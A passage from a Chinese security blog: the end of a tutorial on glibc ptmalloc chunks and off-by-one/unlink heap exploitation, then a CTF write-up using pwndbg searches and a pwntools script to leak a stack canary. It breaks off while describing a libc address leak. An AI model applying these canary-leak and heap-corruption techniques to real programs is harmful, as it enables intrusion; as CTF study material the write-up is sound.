<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块 </li>
</ul>
<p><strong>chunk有两种状态</strong>：allocate chunk 和 free chunk</p>
<p>allocate chunk：用户正在使用的chunk，fd&amp;bk处用于存放数据</p>
<p>free chunk：程序中空闲的chunk，fd&amp;bk分别为指向 “后一个free chunk”和“前一个free chunk”</p>
<p>也就是说，只有allocate chunk中会存放数据，而free chunk会以<strong>双向链表</strong>的形式存储起来</p>
<p>allocate chunk：</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641452666463-1659683450531.png" class width="1641452666463"> 
<p>free chunk：</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641452614487-1659683450532.png" class width="1641452614487"> 
<p><strong>程序该怎样分辨chunk的状态？</strong></p>
<p>在解释这一点之前，先要了解一下<strong>内存对齐</strong></p>
<p>内存对齐是为了“程序执行效率”而诞生的一种机制，它可以优化CPU识别地址的效率</p>
<p>glibc的堆内存对齐机制：</p>
<p>32位：<br>最少分配16字节堆，8字节对齐，每次增加8<br>其中4字节为头部，申请1-12堆，分配16字节堆</p>
<p>64位：<br>最少分配32字节堆，16字节对齐，每次增加16<br>其中8字节为头部，申请1-24堆，分配32字节堆</p>
<p>不管是32位（8字节对齐），还是64位（16字节对齐），chunk的大小都是 <strong>8的倍数</strong> ，也就是说，<strong>chunk -&gt; size</strong> 的最后3位恒为“0”，ptmalloc算法干脆就把这3位当成了标志位，用于描述一些chunk的信息</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641455617594-1659683450532.png" class width="1641455617594">  
<p>P位：指示相邻的前一个堆块是alloc还是free</p>
<p>M位：是否属于主进程</p>
<p>N位：是否由 mmap() 分配</p>
<h2 id="chunk分类"><a href="#chunk分类" class="headerlink" title="chunk分类"></a>chunk分类</h2><p>除了根据P位进行的分类：allocate chunk &amp; free chunk </p>
<p>还有：top chunk &amp; last remainder chunk </p>
<p>glibc提供给用户的chunk主要就分为这4类</p>
<ul>
<li>top chunk：处于一个arena的最顶部(即最高内存地址处)的chunk</li>
<li>last remainder chunk：unsorted bin中的最后一个chunk </li>
</ul>
<p>这里引入了“bin”的概念，不过我想在UAF中分析“bin”，这里就先提一下吧：</p>
<ul>
<li>small chunk：小于512（1024）字节的chunk</li>
<li>large chunk：大于512（1024）字节的chunk</li>
</ul>
<h2 id="chunk合并"><a href="#chunk合并" class="headerlink" title="chunk合并"></a>chunk合并</h2><p>先说说off-by-one的效果</p>
<p>两个相邻的chunk中（“chunk1”和“chunk2”），对“chunk1”进行操作（通常要用到UAF）使其溢出一字节到“chunk2”中，而它就会覆盖“chunk2”的presize的最后一字节</p>
<p>看上去好像没什么作用，但它的威力的确很大</p>
<p>因为在free掉“chunk2”后会发生 <strong>chunk合并</strong>，一共有两种合成方式：</p>
<p><strong>向前合并</strong>（将要被free的chunk作为素材，被后一个chunk合并）</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639027341437-1659683450532.png" class width="1639027341437"> 
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639027400761-1659683450532.png" class width="1639027400761"> 
<p>chunk将要被free时，通过 <strong>inuse_bit_at_offset</strong> 检测 <strong>后一个</strong> chunk是否为free，如果是的话，将要被free的chunk会把它自己size加上nextsize（后一个chunk的大小），然后让新的chunk进入 <strong>unlink流程</strong></p>
<p><strong>向后合并</strong>（将要被free的chunk作为素材，被前一个chunk合并）</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1638982092225-1659683450532.png" class width="1638982092225"> 
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1638982103542-1659683450532.png" class width="1638982103542"> 
<p>chunk将要被free时，通过 <strong>自己的sizeP位</strong> 检测 <strong>前一个</strong> chunk是否为free，如果是的话，它会把它自己的size加到前一块chunk的size中 ，然后让新的chunk进入 <strong>unlink流程</strong></p>
<p><strong>unlink</strong></p>
<p>unlink是一个宏操作，用于将某一个空闲chunk 从其所处的双向链表中脱链 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</span></span></span><br><span class="line"><span class="function"></span>&#123;	<span class="comment">//p是某个结构体“malloc_chunk”的地址，*p就是结构体本身（进行了降阶）</span></span><br><span class="line">    FD = P-&gt;fd;		<span class="comment">//FD就是指向下一个结构体的指针</span></span><br><span class="line">    BK = P-&gt;bk;		<span class="comment">//BK就是指向上一个结构体的指针</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action,<span class="string">&quot;corrupted double-linked list&quot;</span>,P);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;	</span><br><span class="line">        FD-&gt;bk = BK;	<span class="comment">//FD-&gt;bk：下一个结构体中的last</span></span><br><span class="line">        BK-&gt;fd = FD;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>unlink执行之前会先进行一个检查：</p>
<ul>
<li>当前这个chunkP的后一个chunk的<strong>fd</strong> == chunkP 是否成立</li>
<li>当前这个chunkP的前一个chunk的<strong>bk</strong> == chunkP 是否成立</li>
</ul>
<p>简单来说，它就是检查了：</p>
<ul>
<li>chunkP的下一个chunk的上一个chunk是不是chunkP</li>
<li>chunkP的上一个chunk的下一个chunk是不是chunkP</li>
</ul>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639014959836-1659683450532.png" class width="1639014959836">  
<p>解释unlink函数：</p>
<ul>
<li>FD-&gt;bk = BK：让P结构体的下一个结构体中的 <strong>bk</strong> 变为 <strong>P本身的bk</strong></li>
<li>BK-&gt;fd = FD：让P结构体的上一个结构体中的 <strong>fd</strong> 变为 <strong>P本身的fd</strong></li>
</ul>
<p>就相当于跳过了<strong>P</strong>这个结构体，把 <strong>FD</strong> 和 <strong>BK</strong> 连接 </p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1660198943002.png" class width="1660198943002">  
<h2 id="off-by-one的利用姿势"><a href="#off-by-one的利用姿势" class="headerlink" title="off-by-one的利用姿势"></a>off-by-one的利用姿势</h2><p>off-by-one有多种利用方式：</p>
<ul>
<li>覆盖低字节数据（如果是地址，还可以改变其指向）</li>
<li>覆盖“size的P位”为“\x00”，伪造上一个为“free chunk”（allocate chunk的“presize”是上一个allocate chunk的数据区，所以可以溢出一字节刚好到P位）</li>
</ul>
<p>常见的造成off-by-one的原因：</p>
<ul>
<li>strlen 和 strcpy 行为不一：strlen 计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 却会拷贝 ‘\x00’ ，导致了off-by-null</li>
<li><em>( </em>(&amp;list + index)  + read(0, *(&amp;list + index) , size) ) = 0：在read写入的字节后加一个“\x00”，这种操作可以中断“打印模块”（许多打印函数会被“\x00”中断），但它也溢出了一个“\x00”出去</li>
</ul>
<p>这里介绍一种特殊的利用姿势，可以实现<strong>WAA</strong>（又叫做Unlink攻击）</p>
<p>条件：可以利用UAF漏洞编辑free chunk</p>
<p>目的：溢出一字节，改变后一个chunk的presize， 导致其<strong>后向合并判断错误</strong></p>
<p>那如果我们在“chunk1”中伪造一个“chunkF”，溢出一字节改变“chunk2”的presize，然后free掉chunk2执行后向合并，就会出现很奇妙的结果</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641459067172-1659683450532.png" class width="1641459067172"> 
<p>​        // 注意：这些操作都是在free chunk中进行的，所以有“presize”</p>
<p>伪装的“chunkF”被“chunk2”当成了合并的目标，如果“chunkF”的“ fd&amp;bk ”控制的好，就可以在通过unlink检查的同时实现<strong>WAA</strong>（write anything anywhere）</p>
<p>​        //这里先简单提一提，到了分析Unlink攻击的再详细分析</p>
<h2 id="libc版本限制"><a href="#libc版本限制" class="headerlink" title="libc版本限制"></a>libc版本限制</h2><p>“libc-2.29.so”及其之后的版本加入了一个chunk检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>需要 prechunk-&gt;size == chunk-&gt;presize</li>
</ul>
<p>由于我们难以控制一个真实 chunk 的 size 字段，所以传统的 off-by-null 方法失效，但是，只需要满足被 unlink 的 chunk 和下一个 chunk 相连，所以仍然可以伪造 fake_chunk</p>
<p>最后还要绕过 unlink 的检查，如果我们没法 leak heap_base，就要通过以下的办法进行绕过：</p>
<ul>
<li>伪造的方式就是使用 large bin 遗留的 fd_nextsize 和 bk_nextsize 指针，以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk，这样我们可以完全控制该 fake_chunk 的 size 字段 </li>
<li>也可以使用 unsorted chunk 或者 large chunk 的 FD BK 指针，就是对堆风水的要求比较高</li>
<li>PS：伪造的方法在“Unlink攻击”中分析</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/" class="post-title-link" itemprop="url">pwndbg搜索技巧+one_gadget</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-01-06 08:23:52 / Modified: 08:49:56" itemprop="dateCreated datePublished" datetime="2022-01-06T08:23:52+08:00">2022-01-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>pwndbg搜索技巧+one_gadget</strong></p>
<p>这是某个CTF比赛上的题目</p>
<p>记得当时在打比赛时死活搞不出来“__libc_start_main”的偏移量（其实我都已经在GDB中看见了），看国外某大佬的WP后学到了不少关于“pwndbg搜索”的知识</p>
<p>通过这个题目我也纠正了不少概念上的误区，于是在此记录</p>
<hr>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000070341.png" alt="1641000070341"> </p>
<p>循环输入</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000121563.png" alt="1641000121563"> </p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000135559.png" alt="1641000135559"> </p>
<p>64位，dynamically，全开</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000226315.png" alt="1641000226315">  </p>
<p><strong>代码分析</strong></p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000431581.png" alt="1641000431581">  </p>
<p>获取数据数到“buf”中</p>
<p>sub_ACA：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000694377.png" alt="1641000694377"> </p>
<p>在s1中读入256字节（遇到“\n”就中断）</p>
<p>小循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000905974.png" alt="1641000905974"> </p>
<p>如果前3个字节是”id “就把“v5”转换为整数并赋值给“v1”，否则就break</p>
<p>大循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001004738.png" alt="1641001004738"> </p>
<p>如果前6字节是“create”就执行函数sub_BD1，否则就break</p>
<p>sub_BD1：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001295275.png" alt="1641001295275"> </p>
<p>随机生成一段字符串</p>
<p>特大循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001361592.png" alt="1641001361592"> </p>
<p>如果前4字节是“quit”则break结束程序</p>
<p><strong>漏洞分析</strong></p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641003509946.png" alt="1641003509946">  </p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001641478.png" alt="1641001641478"> </p>
<p>这里就有数组越位和栈溢出</p>
<p>没有system，没有“/bin/sh”</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641379976647.png" alt="1641379976647"> </p>
<p>“buf[v1]”并没有好好检查下标</p>
<p><strong>入侵思路</strong></p>
<p>首先考虑绕开PIE和Canary</p>
<p>那么这么泄露地址呢？</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641003528827.png" alt="1641003528827"> </p>
<p>输出函数printf可以输出“s”的值，而“s”是用随机数拼凑出来的，而且有memset填充“0”，想控制printf根本不可能</p>
<p>但是有一种邪门的方式可以泄露canary：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641379976647-1641430195129.png" alt="1641379976647"> </p>
<p>“buf[v1]”并没有好好检查下标，也就是说，程序会把任何栈上的数据给放入“sub_BD1”进行加密，如果我们对加密后的数据进行分析，说不定就可以还原加密值</p>
<p>那么这里有两个问题需要解决：</p>
<p>1.canary相对于“buf[0]”的偏移</p>
<p>2.获取对应偏移的对应值</p>
<p>第一个问题需要在pwndbg中看： </p>
<p>在函数“sub_BD1”调用时，RAX中的值就是“buf[0]”（在ID那里输入的“0”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0xf593</span></span><br><span class="line"> RBX  <span class="number">0x555555400e10</span> ◂— push   r15</span><br><span class="line"> RCX  <span class="number">0xffffffc0</span></span><br><span class="line"> RDX  <span class="number">0x6</span></span><br><span class="line">*RDI  <span class="number">0xf593</span></span><br><span class="line"> RSI  <span class="number">0x555555400f09</span> ◂— movsxd rsi, dword ptr [rdx + <span class="number">0x65</span>] <span class="comment">/* &#x27;create&#x27; */</span></span><br><span class="line"> R8   <span class="number">0x2</span></span><br><span class="line"> R9   <span class="number">0x2</span></span><br><span class="line"> R10  <span class="number">0x555555400f02</span> ◂— <span class="keyword">and</span>    byte ptr ds:[rax], al <span class="comment">/* &#x27;&gt; &#x27; */</span></span><br><span class="line"> R11  <span class="number">0x6</span></span><br><span class="line"> R12  <span class="number">0x5555554009c0</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffddf0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdc60</span> ◂— <span class="number">0xd68</span> <span class="comment">/* &#x27;h\r&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x555555400d80</span> ◂— call   <span class="number">0x555555400bd1</span></span><br></pre></td></tr></table></figure>
<p>发现其值为 <strong>“0xf593”</strong> ，用pwngdb查找这个字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t word <span class="number">0xf593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78381</span> <span class="number">0x81fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78385</span> <span class="number">0x5fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78389</span> <span class="number">0x9ffff59105fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78395</span> <span class="number">0x81fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78399</span> <span class="number">0xf3fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f7839d</span> <span class="number">0xfff58ff3fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f87fe9</span> <span class="number">0xd400019d60fff593</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffdbfc</span> <span class="number">0xf593</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffdc76</span> <span class="number">0x86a89b009b7df593</span> </span><br></pre></td></tr></table></figure>
<p>接着找寻canary的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary</span><br><span class="line">AT_RANDOM = <span class="number">0x7fffffffe149</span> <span class="meta"># points to (not masked) global canary value</span></span><br><span class="line">Canary    = <span class="number">0x959c7d572835fc00</span> (may be incorrect on != glibc)</span><br><span class="line">Found valid canaries on the stacks:</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffd558</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffd5c8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdac8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb28</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb38</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb98</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdc48</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br></pre></td></tr></table></figure>
<p>查找“0x959c7d572835fc00”（canary）的地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[anon_7ffff7fb1] <span class="number">0x7ffff7fb6568</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffb3e8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffb458</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffd558</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffd5c8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdac8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb28</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb38</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb98</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdc48</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdcd8</span> <span class="number">0x959c7d572835fc00</span></span><br></pre></td></tr></table></figure>
<p>现在我们找到了canary中出现的随机数的地址，还有“buf[0]”中随机数的地址</p>
<p>按道理来说，两者相减就可以得到canary随机数相对于“buf[0]”的偏移了，但是我们却搜索到了多组数据，这是因为这些数据可能在随机数表中多次出现</p>
<p>只有一次一次尝试，把离谱的排除了之后就得到偏移了（相当看脸）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdcd8</span> - <span class="number">0x7fffffffdc76</span> = <span class="number">98</span></span><br><span class="line"><span class="number">98</span> / <span class="number">2</span> = <span class="number">49</span>  <span class="comment">#数组buf的类型为‘int16’</span></span><br></pre></td></tr></table></figure>
<p>第二个问题有一点麻烦：（先看一段代码）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hashes = &#123;&#125;</span><br><span class="line">stack_canary_offset = <span class="number">49</span></span><br><span class="line">charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;id &#x27;</span> + <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your key: &#x27;</span>)</span><br><span class="line">    key = p.recvline().strip().decode()</span><br><span class="line">    value = hashes[key]</span><br><span class="line">    log.info(<span class="string">&#x27;Offset &#123;&#125;: &#123;&#125; (&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(offset, key, <span class="built_in">hex</span>(value)))</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">precompute</span>():</span></span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>): <span class="comment">#循环少了匹配的几率小，循环多了匹配的时间长</span></span><br><span class="line">        libc.srand(i)</span><br><span class="line">        val = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            val += charset[libc.rand() % <span class="built_in">len</span>(charset)]</span><br><span class="line">        hashes[val] = i</span><br><span class="line">    log.info(<span class="string">&quot;Computed &#123;&#125; hashes.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(hashes)))</span><br><span class="line"></span><br><span class="line">precompute()</span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	canary+=(leak(stack_canary_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
<p>函数<strong>leak</strong>中的offset其实就是canary在随机数表中的偏移，对应偏移中存放的数据就是canary片段的值，这里我们可以用一个很骚的方式获取这个值</p>
<p>我们直接把canary的偏移输入给程序，程序就会读取canary的值，并且用这个值来生成“32位”字符串，我们这里用循环<strong>“从 0 到 0xffff+1”</strong> 依次生成“32位”字符串，然后把“程序生成的”和“我们生成的”进行对比，如果可以匹配就证明canary的值就是对应的下标</p>
<p>​        // 当然也有小概率会重复，多试几次就好了</p>
<p>解决了canary就要考虑怎么获取shell的问题：</p>
<p>首先程序开了PIE的，ROP基本上废了，需要泄露“__libc_start_main”</p>
<p>我们可以用泄露canary的方式来泄露“__libc_start_main”（就是有一点麻烦）</p>
<p>先在pwndbg中看”buf[0]”的数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x9bf0</span></span><br><span class="line"> RBX  <span class="number">0x555555400e10</span> ◂— push   r15</span><br><span class="line"> RCX  <span class="number">0xffffffc0</span></span><br><span class="line"> RDX  <span class="number">0x6</span></span><br><span class="line">*RDI  <span class="number">0x9bf0</span></span><br><span class="line"> RSI  <span class="number">0x555555400f09</span> ◂— movsxd rsi, dword ptr [rdx + <span class="number">0x65</span>] /* <span class="string">&#x27;create&#x27;</span> */</span><br><span class="line"> R8   <span class="number">0x2</span></span><br><span class="line"> 